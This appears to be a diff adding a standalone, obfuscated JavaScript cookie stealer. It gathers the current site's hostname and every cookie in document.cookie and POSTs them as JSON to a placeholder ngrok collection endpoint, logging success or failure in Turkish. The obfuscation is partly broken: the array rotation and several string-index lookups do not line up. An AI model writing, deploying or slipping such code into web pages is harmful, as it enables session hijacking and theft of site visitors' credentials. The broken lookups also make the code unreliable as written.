@@ -1,0 +1,36 @@
+(function() {
+    const _0x4f2b = ['split', 'map', 'trim', 'split', 'name', 'value', 'hostname', 'location', 'cookie', 'document', 'POST', 'Content-Type', 'application/json', 'stringify', 'fetch', 'then', 'ok', 'json', 'Çerezler başarıyla gönderildi:', 'log', 'catch', 'Çerez gönderimi başarısız:', 'error'];
+    (function(_0x2d5b1f, _0x4f2b5d) {
+        const _0x4f2b6e = function(_0x2d5b1f) {
+            while (--_0x2d5b1f) {
+                _0x2d5b1f['push'](_0x2d5b1f['shift']());
+            }
+        };
+        _0x4f2b6e(++_0x4f2b5d);
+    }(_0x4f2b, 0x1a0));
+    const _0x2d5b = function(_0x2d5b1f, _0x4f2b5d) {
+        _0x2d5b1f = _0x2d5b1f - 0x0;
+        let _0x4f2b6e = _0x4f2b[_0x2d5b1f];
+        return _0x4f2b6e;
+    };
+    const _0x2d5b1f = window[_0x2d5b('0x7')][_0x2d5b('0x6')];
+    const _0x4f2b5d = document[_0x2d5b('0x9')][_0x2d5b('0x0')](';')[_0x2d5b('0x1')](cookie => cookie[_0x2d5b('0x2')]())[_0x2d5b('0x1')](cookie => {
+        const [_0x2d5b6e, _0x4f2b7d] = cookie[_0x2d5b('0x3')]('=');
+        return { [_0x2d5b('0x4')]: _0x2d5b6e, [_0x2d5b('0x5')]: _0x4f2b7d };
+    });
+    const _0x4f2b6e = { 'siteName': _0x2d5b1f, 'cookies': _0x4f2b5d };
+    fetch('https://ngrokadresiniz/collect-cookies', {
+        'method': _0x2d5b('0xa'),
+        'headers': { [_0x2d5b('0xb')]: _0x2d5b('0xc') },
+        'body': JSON[_0x2d5b('0xd')](_0x4f2b6e)
+    })[_0x2d5b('0xe')](response => {
+        if (!response[_0x2d5b('0xf')]) {
+            throw new Error('Network response was not ok');
+        }
+        return response[_0x2d5b('0x10')]();
+    })[_0x2d5b('0xe')](result => {
+        console[_0x2d5b('0x12')](_0x2d5b('0x11'), result);
+    })[_0x2d5b('0x13')](error => {
+        console[_0x2d5b('0x15')](_0x2d5b('0x14'), error);
+    });
+})();
